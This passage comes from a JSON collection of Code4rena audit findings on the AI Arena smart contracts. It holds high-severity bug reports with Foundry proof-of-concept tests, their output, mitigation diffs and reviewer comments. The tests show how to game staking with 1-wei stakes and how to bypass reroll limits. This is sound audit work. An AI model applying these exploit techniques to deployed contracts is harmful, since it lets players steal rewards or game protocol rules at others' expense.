        "MrPotatoMagic",
        "klau5",
        "visualbits",
        "juancito",
        "ke1caM",
        "WoolCentaur",
        "aslanbek",
        "0xStriker",
        "0xbranded",
        "KupiaSec",
        "pkqs90",
        "SpicyMeatball",
        "haxatron",
        "ktg",
        "Topmark",
        "btk",
        "VAD37",
        "d3e4",
        "blutorque",
        "\\_eperezok",
        "immeas",
        "lil\\_eth",
        "Aamir",
        "Draiakoo",
        "devblixt",
        "Aymen0909",
        "sandy",
        "nuthan2x",
        "sl1",
        "Varun\\_05",
        "alexzoid",
        "alexxander",
        "AgileJune",
        "Tychai0s",
        "radin100",
        "evmboi32",
        "1",
        "vnavascues",
        "Krace",
        "2",
        "0xmystery",
        "Giorgio",
        "merlinboii",
        "peter",
        "fnanni",
        "0xlamide",
        "DarkTower",
        "0xCiphky",
        "sashik\\_eth",
        "PoeAudits",
        "pynschon",
        "petro\\_1912",
        "jesjupyter",
        "ubl4nk"
      ]
    },
    {
      "id": "32188",
      "title": "[H-06] `FighterFarm::reRoll` won't work for nft id greater than 255 due to input limited to uint8",
      "impact": "HIGH",
      "content": "\n`FighterFarm::reRoll` uses uint8 for nft id as input, which will stop people calling this function who owns id greater than 255. It will lead to not being able to use the reRoll to get random traits, which could have been better for there game performance.\n\n### Proof of Concept\n\nAffect code can be [seen here](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L370-L391).\n\nAdding code snippet below as well, for better clarity:\n\n```solidity\n    /// @notice Rolls a new fighter with random traits.\n    /// @param tokenId ID of the fighter being re-rolled.\n    /// @param fighterType The fighter type.\n@>    function reRoll(uint8 tokenId, uint8 fighterType) public {\n        require(msg.sender == ownerOf(tokenId));\n        require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);\n        require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, \"Not enough NRN for reroll\");\n\n        _neuronInstance.approveSpender(msg.sender, rerollCost);\n        bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);\n        if (success) {\n            numRerolls[tokenId] += 1;\n            uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));\n            (uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);\n            fighters[tokenId].element = element;\n            fighters[tokenId].weight = weight;\n            fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(\n                newDna,\n                generation[fighterType],\n                fighters[tokenId].iconsType,\n                fighters[tokenId].dendroidBool\n            );\n            _tokenURIs[tokenId] = \"\";\n        }\n    }   \n```\n\nIf you notice the highlighted line (first line of function), it takes `uint8` as input for `tokenId` parameter. Which will restrict users to call this function when they own nft id greater than 255.\n\nValue will go out of bounds when user will input 256 or more.\n\n### Recommended Mitigation Steps\n\nUse uint256 for nft id input to fix the issue.\n\n```diff\n- function reRoll(uint8 tokenId, uint8 fighterType) public {\n+ function reRoll(uint256 tokenId, uint8 fighterType) public {\n   require(msg.sender == ownerOf(tokenId));\n        require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);\n        require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, \"Not enough NRN for reroll\");\n\n        _neuronInstance.approveSpender(msg.sender, rerollCost);\n        bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);\n        if (success) {\n            numRerolls[tokenId] += 1;\n            uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));\n            (uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);\n            fighters[tokenId].element = element;\n            fighters[tokenId].weight = weight;\n            fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(\n                newDna,\n                generation[fighterType],\n                fighters[tokenId].iconsType,\n                fighters[tokenId].dendroidBool\n            );\n            _tokenURIs[tokenId] = \"\";\n        }\n    }\n```\n\n**[raymondfam (lookout) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/68#issuecomment-1958376082):**\n > Unsigned integer type limitation indeed.\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/68#issuecomment-1975477042)**\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> Fixed reRoll for fighters with tokenIds greater than 255.<br>\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/1\n\n**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/12), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/45), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/2).\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the `FighterFarm::reRoll` function in the AI Arena game. This function uses a `uint8` data type for the `tokenId` input, which can cause problems for users who own tokens with an ID greater than 255. This can lead to errors and prevent users from being able to use the function to get random traits for their fighters. The report recommends using a `uint256` data type instead to fix the issue. The AI Arena team has confirmed and mitigated the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/68",
      "tags": [],
      "finders": [
        "korok",
        "pontifex",
        "0xShitgem",
        "ahmedaghadi",
        "kiqo",
        "Greed",
        "givn",
        "0xAlix2",
        "abhishek\\_thaku\\_r",
        "offside0011",
        "MrPotatoMagic",
        "klau5",
        "iamandreiski",
        "ktg",
        "immeas",
        "Draiakoo",
        "0xDetermination",
        "yotov721",
        "stakog",
        "alexzoid",
        "Tychai0s",
        "dimulski",
        "fnanni",
        "swizz",
        "Fulum",
        "sashik\\_eth",
        "PoeAudits",
        "maxim371",
        "kartik\\_giri\\_47538"
      ]
    },
    {
      "id": "32187",
      "title": "[H-05] Malicious user can stake an amount which causes zero curStakeAtRisk on a loss but equal rewardPoints to a fair user on a win",
      "impact": "HIGH",
      "content": "\nThe [\\_getStakingFactor()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L530-L532) function rounds-up the `stakingFactor_` to one if its zero. Additionally, the [\\_addResultPoints()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L439) function rounds-down the `curStakeAtRisk`.<br>\nWhenever a player loses and has no accumulated reward points, 0.1% of his staked amount is considered \"at risk\" and transferred to the `_stakeAtRiskAddress`. However due to the above calculation styles, he can stake just `1 wei` of NRN to have zero `curStakeAtRisk` in case of a loss and in case of a win, still gain the same amount of reward points as a player staking `4e18-1` wei of NRN. <br>\n\nLet's look at three cases of a player with ELO as 1500:\n\n| Case |      Staked NRN      | stakingFactor calculated by the protocol | Reward Points accumulated in case of a WIN | NRNs lost (stake at risk) in case of a LOSS |\n| :--: | :------------------: | :--------------------------------------: | :----------------------------------------: | :-----------------------------------------: |\n|   1  |           4          |                     2                    |                    1500                    |                    0.004                    |\n|   2  | 3.999999999999999999 |                     1                    |                     750                    |             0.003999999999999999            |\n|   3  | 0.000000000000000001 |                     1                    |                     750                    |                      0                      |\n\nAs can be seen in Case2 vs Case3, a player staking `0.000000000000000001 NRN` (1 wei) has the same upside in case of a win as a player staking `3.999999999999999999 NRN` (4e18-1 wei) while their downside is `0`.\n\n### Proof of Concept\n\nAdd the following test inside `test/RankedBattle.t.sol` and run via `forge test -vv --mt test_t0x1c_UpdateBattleRecord_SmallStake` to see the ouput under the 3 different cases:\n\n<details>\n\n```js\n    function test_t0x1c_UpdateBattleRecord_SmallStake() public {\n        address player = vm.addr(3);\n        _mintFromMergingPool(player);\n        uint8 tokenId = 0;\n        _fundUserWith4kNeuronByTreasury(player);\n        \n        // snapshot the current state\n        uint256 snapshot0 = vm.snapshot();\n\n        vm.prank(player);\n        _rankedBattleContract.stakeNRN(4e18, 0);\n\n        console.log(\"\\n\\n==================================== CASE 1 ==========================================================\");\n        emit log_named_decimal_uint(\"Stats when staked amount =\", 4e18, 18);\n\n        // snapshot the current state\n        uint256 snapshot0_1 = vm.snapshot();\n\n        vm.prank(address(_GAME_SERVER_ADDRESS));\n        _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true); // if player had won\n        (uint256 wins,,) = _rankedBattleContract.fighterBattleRecord(tokenId);\n        assertEq(wins, 1);\n        \n\n        console.log(\"\\n----------------------------------  IF WON  ---------------------------------------------------\");\n        console.log(\"accumulatedPointsPerFighter =:\", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));\n        emit log_named_decimal_uint(\"getStakeAtRisk =\", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);\n        emit log_named_decimal_uint(\"_rankedBattleContract NRN balance =\", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);\n        emit log_named_decimal_uint(\"_stakeAtRiskContract NRN balance =\", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);\n\n        // Restore to snapshot state\n        vm.revertTo(snapshot0_1);\n\n        vm.prank(address(_GAME_SERVER_ADDRESS));\n        _rankedBattleContract.updateBattleRecord(0, 50, 2, 1500, true); // if player had lost\n        (,, uint256 losses) = _rankedBattleContract.fighterBattleRecord(tokenId);\n        assertEq(losses, 1);\n\n        console.log(\"\\n----------------------------------  IF LOST  ---------------------------------------------------\");\n        console.log(\"accumulatedPointsPerFighter =\", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));\n        emit log_named_decimal_uint(\"getStakeAtRisk =\", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);\n        emit log_named_decimal_uint(\"_rankedBattleContract NRN balance =\", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);\n        emit log_named_decimal_uint(\"_stakeAtRiskContract NRN balance =\", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);\n\n\n        // Restore to snapshot state\n        vm.revertTo(snapshot0);\n\n        vm.prank(player);\n        _rankedBattleContract.stakeNRN(4e18-1, 0);\n\n        console.log(\"\\n\\n==================================== CASE 2 ==========================================================\");\n        emit log_named_decimal_uint(\"Stats when staked amount =\", 4e18-1, 18);\n\n        // snapshot the current state\n        uint256 snapshot1_1 = vm.snapshot();\n\n        vm.prank(address(_GAME_SERVER_ADDRESS));\n        _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true); // if player had won\n        (wins,,) = _rankedBattleContract.fighterBattleRecord(tokenId);\n        assertEq(wins, 1);\n        \n\n        console.log(\"\\n----------------------------------  IF WON  ---------------------------------------------------\");\n        console.log(\"accumulatedPointsPerFighter =:\", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));\n        emit log_named_decimal_uint(\"getStakeAtRisk =\", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);\n        emit log_named_decimal_uint(\"_rankedBattleContract NRN balance =\", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);\n        emit log_named_decimal_uint(\"_stakeAtRiskContract NRN balance =\", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);\n\n        // Restore to snapshot state\n        vm.revertTo(snapshot1_1);\n\n        vm.prank(address(_GAME_SERVER_ADDRESS));\n        _rankedBattleContract.updateBattleRecord(0, 50, 2, 1500, true); // if player had lost\n        (,, losses) = _rankedBattleContract.fighterBattleRecord(tokenId);\n        assertEq(losses, 1);\n\n        console.log(\"\\n----------------------------------  IF LOST  ---------------------------------------------------\");\n        console.log(\"accumulatedPointsPerFighter =\", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));\n        emit log_named_decimal_uint(\"getStakeAtRisk =\", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);\n        emit log_named_decimal_uint(\"_rankedBattleContract NRN balance =\", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);\n        emit log_named_decimal_uint(\"_stakeAtRiskContract NRN balance =\", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);\n\n\n        // Restore to snapshot state\n        vm.revertTo(snapshot0);\n\n        vm.prank(player);\n        _rankedBattleContract.stakeNRN(1, 0);\n\n        console.log(\"\\n\\n==================================== CASE 3 ==========================================================\");\n        emit log_named_decimal_uint(\"Stats when staked amount =\", 1, 18);\n\n        // snapshot the current state\n        uint256 snapshot2_1 = vm.snapshot();\n\n        vm.prank(address(_GAME_SERVER_ADDRESS));\n        _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true); // if player had won\n        (wins,,) = _rankedBattleContract.fighterBattleRecord(tokenId);\n        assertEq(wins, 1);\n        \n\n        console.log(\"\\n----------------------------------  IF WON  ---------------------------------------------------\");\n        console.log(\"accumulatedPointsPerFighter =:\", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));\n        emit log_named_decimal_uint(\"getStakeAtRisk =\", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);\n        emit log_named_decimal_uint(\"_rankedBattleContract NRN balance =\", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);\n        emit log_named_decimal_uint(\"_stakeAtRiskContract NRN balance =\", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);\n\n        // Restore to snapshot state\n        vm.revertTo(snapshot2_1);\n\n        vm.prank(address(_GAME_SERVER_ADDRESS));\n        _rankedBattleContract.updateBattleRecord(0, 50, 2, 1500, true); // if player had lost\n        (,, losses) = _rankedBattleContract.fighterBattleRecord(tokenId);\n        assertEq(losses, 1);\n\n        console.log(\"\\n----------------------------------  IF LOST  ---------------------------------------------------\");\n        console.log(\"accumulatedPointsPerFighter =\", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));\n        emit log_named_decimal_uint(\"getStakeAtRisk =\", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);\n        emit log_named_decimal_uint(\"_rankedBattleContract NRN balance =\", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);\n        emit log_named_decimal_uint(\"_stakeAtRiskContract NRN balance =\", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);\n    }\n```\n</details>\n\nOutput:\n\n<details>\n\n```text\n==================================== CASE 1 ==========================================================\n  Stats when staked amount =: 4.000000000000000000\n\n----------------------------------  IF WON  ---------------------------------------------------\n  accumulatedPointsPerFighter =: 1500\n  getStakeAtRisk =: 0.000000000000000000\n  _rankedBattleContract NRN balance =: 4.000000000000000000\n  _stakeAtRiskContract NRN balance =: 0.000000000000000000\n\n----------------------------------  IF LOST  ---------------------------------------------------\n  accumulatedPointsPerFighter = 0\n  getStakeAtRisk =: 0.004000000000000000\n  _rankedBattleContract NRN balance =: 3.996000000000000000\n  _stakeAtRiskContract NRN balance =: 0.004000000000000000\n\n\n==================================== CASE 2 ==========================================================\n  Stats when staked amount =: 3.999999999999999999\n\n----------------------------------  IF WON  ---------------------------------------------------\n  accumulatedPointsPerFighter =: 750\n  getStakeAtRisk =: 0.000000000000000000\n  _rankedBattleContract NRN balance =: 3.999999999999999999\n  _stakeAtRiskContract NRN balance =: 0.000000000000000000\n\n----------------------------------  IF LOST  ---------------------------------------------------\n  accumulatedPointsPerFighter = 0\n  getStakeAtRisk =: 0.003999999999999999\n  _rankedBattleContract NRN balance =: 3.996000000000000000\n  _stakeAtRiskContract NRN balance =: 0.003999999999999999\n\n\n==================================== CASE 3 ==========================================================\n  Stats when staked amount =: 0.000000000000000001\n\n----------------------------------  IF WON  ---------------------------------------------------\n  accumulatedPointsPerFighter =: 750\n  getStakeAtRisk =: 0.000000000000000000\n  _rankedBattleContract NRN balance =: 0.000000000000000001\n  _stakeAtRiskContract NRN balance =: 0.000000000000000000\n\n----------------------------------  IF LOST  ---------------------------------------------------\n  accumulatedPointsPerFighter = 0\n  getStakeAtRisk =: 0.000000000000000000\n  _rankedBattleContract NRN balance =: 0.000000000000000001\n  _stakeAtRiskContract NRN balance =: 0.000000000000000000\n```\n</details>\n\n### Tools used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nProtocol can choose to set a minimum stake amount of `4 NRN` *(4e18 wei)*. One needs to take care that even after a partial unstake, this amount is not allowed to go below `4 NRN`. <br>\nAlso, do not round up `stakingFactor_` i.e. remove [L530-L532](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L530-L532). An additional check can be added too which ensures that `stakingFactor_` is greater than zero:\n\n```diff\n  File: src/RankedBattle.sol\n\n  519:              function _getStakingFactor(\n  520:                  uint256 tokenId, \n  521:                  uint256 stakeAtRisk\n  522:              ) \n  523:                  private \n  524:                  view \n  525:                  returns (uint256) \n  526:              {\n  527:                uint256 stakingFactor_ = FixedPointMathLib.sqrt(\n  528:                    (amountStaked[tokenId] + stakeAtRisk) / 10**18\n  529:                );\n- 530:                if (stakingFactor_ == 0) {\n- 531:                  stakingFactor_ = 1;\n- 532:                }\n+ 532:                require(stakingFactor_ > 0, \"stakingFactor_ = 0\");\n  533:                return stakingFactor_;\n  534:              }    \n```\n\nThe above fixes would ensure that `curStakeAtRisk` can never be gamed to 0 while still having a positive reward potential.<br>\nIt's may also be a good idea to have a provision to return any \"extra\" staked amount. For example, if only 4 NRN is required to achieve a stakingFactor of 1 and the player stakes 4.5 NRN, then the extra 0.5 NRN could be returned. This however is up to the protocol to consider.\n\n**[raymondfam (lookout) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/116#issuecomment-1959673959):**\n > Strategic dodging to avoid penalty. Might as well fully unstake to make curStakeAtRisk 0. However, points would be zero if at risk penalty were to kick in.\n\n**[hickuphh3 (judge) increased severity to High](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/116#issuecomment-1982247090)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the `_getStakingFactor()` and `_addResultPoints()` functions in the `RankedBattle.sol` contract. The `stakingFactor_` is rounded up to one if it is zero, and the `curStakeAtRisk` is rounded down in the event of a loss. This allows players to exploit the system by staking only `1 wei` of NRN and still receive the same reward points as someone staking `4e18-1` wei of NRN. The report also includes a proof of concept and recommended mitigation steps, such as setting a minimum stake amount and adding a check to ensure `stakingFactor_` is greater than zero. The severity of this bug has been raised to High. ",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/116",
      "tags": [],
      "finders": [
        "3",
        "Merulez99",
        "ni8mare",
        "n0kto",
        "neocrao",
        "0xAadi",
        "Kalogerone",
        "PedroZurdo",
        "t0x1c",
        "Blank\\_Space",
        "AC000123",
        "shaka",
        "djxploit",
        "forgebyola",
        "MidgarAudits",
        "okolicodes",
        "MrPotatoMagic",
        "Silvermist",
        "ZanyBonzy",
        "juancito",
        "0xBinChook",
        "WoolCentaur",
        "aslanbek",
        "israeladelaja",
        "ktg",
        "YouCrossTheLineAlfie",
        "VAD37",
        "d3e4",
        "DanielArmstrong",
        "immeas",
        "handsomegiraffe",
        "Aamir",
        "0rpse",
        "forkforkdog",
        "0xDetermination",
        "yotov721",
        "alexxander",
        "Tychai0s",
        "Abdessamed",
        "evmboi32",
        "dimulski",
        "1",
        "CodeWasp",
        "Krace",
        "2",
        "fnanni",
        "shaflow2",
        "Velislav4o",
        "swizz",
        "ubermensch",
        "0xCiphky",
        "DarkTower",
        "Honour",
        "petro\\_1912"
      ]
    },
    {
      "id": "32186",
      "title": "[H-04] Since you can reroll with a different fighterType than the NFT you own, you can reroll bypassing maxRerollsAllowed and reroll attributes based on a different fighterType",
      "impact": "HIGH",
      "content": "\nCan reroll attributes based on a different fighterType, and can bypass maxRerollsAllowed.\n\n### Proof of Concept\n\n`maxRerollsAllowed` can be set differently depending on the `fighterType`. Precisely, it increases as the generation of fighterType increases.\n\n```solidity\nfunction incrementGeneration(uint8 fighterType) external returns (uint8) {\n    require(msg.sender == _ownerAddress);\n@>  generation[fighterType] += 1;\n@>  maxRerollsAllowed[fighterType] += 1;\n    return generation[fighterType];\n}\n```\n\nThe `reRoll` function does not verify if the `fighterType` given as a parameter is actually the `fighterType` of the given tokenId. Therefore, it can use either 0 or 1 regardless of the actual type of the NFT.\n\nThis allows bypassing `maxRerollsAllowed` for additional reRoll, and to call `_createFighterBase` and `createPhysicalAttributes` based on a different `fighterType` than the actual NFT's `fighterType`, resulting in attributes calculated based on different criteria.\n\n```solidity\nfunction reRoll(uint8 tokenId, uint8 fighterType) public {\n    require(msg.sender == ownerOf(tokenId));\n@>  require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);\n    require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, \"Not enough NRN for reroll\");\n\n    _neuronInstance.approveSpender(msg.sender, rerollCost);\n    bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);\n    if (success) {\n        numRerolls[tokenId] += 1;\n        uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));\n@>      (uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);\n        fighters[tokenId].element = element;\n        fighters[tokenId].weight = weight;\n        fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(\n            newDna,\n@>          generation[fighterType],\n            fighters[tokenId].iconsType,\n            fighters[tokenId].dendroidBool\n        );\n        _tokenURIs[tokenId] = \"\";\n    }\n}\n```\n\nPoC:\n\n1.  First, there is a bug that there is no way to set `numElements`, so add a numElements setter to FighterFarm. This bug has been submitted as a separate report.\n\n    ```solidity\n    function numElementsSetterForPoC(uint8 _generation, uint8 _newElementNum) public {\n        require(msg.sender == _ownerAddress);\n        require(_newElementNum > 0);\n        numElements[_generation] = _newElementNum;\n    }\n    ```\n\n2.  Add a test to the FighterFarm.t.sol file and run it. The generation of Dendroid has increased, and `maxRerollsAllowed` has increased. The user who owns the Champion NFT bypassed `maxRerollsAllowed` by putting the `fighterType` of Dendroid as a parameter in the `reRoll` function.\n\n    ```solidity\n    function testPoCRerollBypassMaxRerollsAllowed() public {\n        _mintFromMergingPool(_ownerAddress);\n        // get 4k neuron from treasury\n        _fundUserWith4kNeuronByTreasury(_ownerAddress);\n        // after successfully minting a fighter, update the model\n        if (_fighterFarmContract.ownerOf(0) == _ownerAddress) {\n            uint8 maxRerolls = _fighterFarmContract.maxRerollsAllowed(0);\n            uint8 exceededLimit = maxRerolls + 1;\n            uint8 tokenId = 0;\n            uint8 fighterType = 0;\n\n            // The Dendroid's generation changed, and maxRerollsAllowed for Dendroid is increased\n            uint8 fighterType_Dendroid = 1;\n\n            _fighterFarmContract.incrementGeneration(fighterType_Dendroid);\n\n            assertEq(_fighterFarmContract.maxRerollsAllowed(fighterType_Dendroid), maxRerolls + 1);\n            assertEq(_fighterFarmContract.maxRerollsAllowed(fighterType), maxRerolls); // Champions maxRerollsAllowed is not changed\n\n            _neuronContract.addSpender(address(_fighterFarmContract));\n\n            _fighterFarmContract.numElementsSetterForPoC(1, 3); // this is added function for poc\n\n            for (uint8 i = 0; i < exceededLimit; i++) {\n                if (i == (maxRerolls)) {\n                    // reRoll with different fighterType\n                    assertEq(_fighterFarmContract.numRerolls(tokenId), maxRerolls);\n                    _fighterFarmContract.reRoll(tokenId, fighterType_Dendroid);\n                    assertEq(_fighterFarmContract.numRerolls(tokenId), exceededLimit);\n                } else {\n                    _fighterFarmContract.reRoll(tokenId, fighterType);\n                }\n            }\n        }\n    }\n    ```\n\n### Recommended Mitigation Steps\n\nCheck `fighterType` at reRoll function.\n\n```diff\nfunction reRoll(uint8 tokenId, uint8 fighterType) public {\n    require(msg.sender == ownerOf(tokenId));\n    require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);\n    require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, \"Not enough NRN for reroll\");\n+   require((fighterType == 1 && fighters[tokenId].dendroidBool) || (fighterType == 0 && !fighters[tokenId].dendroidBool), \"Wrong fighterType\");\n\n    _neuronInstance.approveSpender(msg.sender, rerollCost);\n    bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);\n    if (success) {\n        numRerolls[tokenId] += 1;\n        uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));\n        (uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);\n        fighters[tokenId].element = element;\n        fighters[tokenId].weight = weight;\n        fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(\n            newDna,\n            generation[fighterType],\n            fighters[tokenId].iconsType,\n            fighters[tokenId].dendroidBool\n        );\n        _tokenURIs[tokenId] = \"\";\n    }\n}\n```\n\n**[raymondfam (lookout) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/306#issuecomment-1958470461):**\n > This report covers three consequences from the same root cause of fighter type validation: 1. more re-rolls, 2. rarer attribute switch, 3. generation attribute switch, with coded POC.\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/306#issuecomment-1975486304)**\n\n**[hickuphh3 (judge) increased severity to High and commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/306#issuecomment-1977947164):**\n > Note: [issue 212](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/212)'s fix is a little more elegant.\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/17\n\n**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/22), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/44), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/25).\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses a problem in the AI Arena code where players can reroll their fighter's attributes multiple times without being limited by the maximum number of rerolls allowed. This is because the code does not properly check the fighter type when a player uses the reroll function. This allows players to bypass the maximum reroll limit and create fighters with attributes that are calculated based on different criteria. The report includes a proof of concept and recommended steps to mitigate the issue. The AI Arena team has confirmed and mitigated the bug.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/306",
      "tags": [],
      "finders": [
        "n0kto",
        "zhaojohnson",
        "0xvj",
        "14si2o\\_Flint",
        "givn",
        "0xAsen",
        "t0x1c",
        "Blank\\_Space",
        "shaka",
        "soliditywala",
        "0xKowalski",
        "0xAlix2",
        "grearlake",
        "Ryonen",
        "solmaxis69",
        "MrPotatoMagic",
        "Silvermist",
        "klau5",
        "juancito",
        "ke1caM",
        "aslanbek",
        "denzi\\_",
        "SpicyMeatball",
        "haxatron",
        "ktg",
        "Davide",
        "btk",
        "VAD37",
        "d3e4",
        "DanielArmstrong",
        "blutorque",
        "Aamir",
        "Draiakoo",
        "0xAleko",
        "Aymen0909",
        "yotov721",
        "nuthan2x",
        "sl1",
        "Varun\\_05",
        "alexzoid",
        "alexxander",
        "novamanbg",
        "radin100",
        "BARW",
        "0xlemon",
        "evmboi32",
        "McToady",
        "1",
        "vnavascues",
        "2",
        "merlinboii",
        "Giorgio",
        "linmiaomiao",
        "fnanni",
        "pynschon",
        "matejdb",
        "0xCiphky",
        "sashik\\_eth",
        "PoeAudits",
        "AlexCzm",
        "lanrebayode77",
        "petro\\_1912",
        "jesjupyter",
        "ubl4nk",
        "xchen1130"
      ]
    },
    {
      "id": "32185",
      "title": "[H-03] Players have complete freedom to customize the fighter NFT when calling `redeemMintPass` and can redeem fighters of types Dendroid and with rare attributes",
      "impact": "HIGH",
      "content": "\nThe function [redeemMintPass](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L233-L262) allows burning multiple mint passes in exchange for fighters' NFTs. It is mentioned by the sponsor that the player should not have a choice of customizing the fighters' properties and their type. However, nothing prevents a player from:\n\n1.  Providing `uint8[] fighterTypes` of values `1` to mint fighters of types *Dendroid*.\n2.  Checking previous transactions in which the [`dna` provided](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L237) led to minting fighters with rare physical attributes, copying those Dnas and passing them to the [redeemMinPass](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L237) to mint fighters with low rarity attributes. That is because creating physical attributes is [deterministic](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/AiArenaHelper.sol#L83-L121), so providing the same inputs leads to generating a fighter with the same attributes.\n\n### Impact\n\nThis issue has two major impacts:\n\n*   Players with valid mint passes can mint fighters of type Dendroid easily.\n*   Players with valid mint passes can mint easily fighters with low rarity attributes which breaks the pseudo-randomness attributes generation aspect\n\n### Proof of Concept\n\nFor someone having valid mint passes, he calls the function [redeemMintPass](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L233) providing [`fighterTypes` array](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L235) of values *1*. For each mint pass, the inner function [\\_createNewFighter](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L257) will be called passing the value *1* as `fighterType` argument which corresponds to *Dendroid*, a new fighter of type 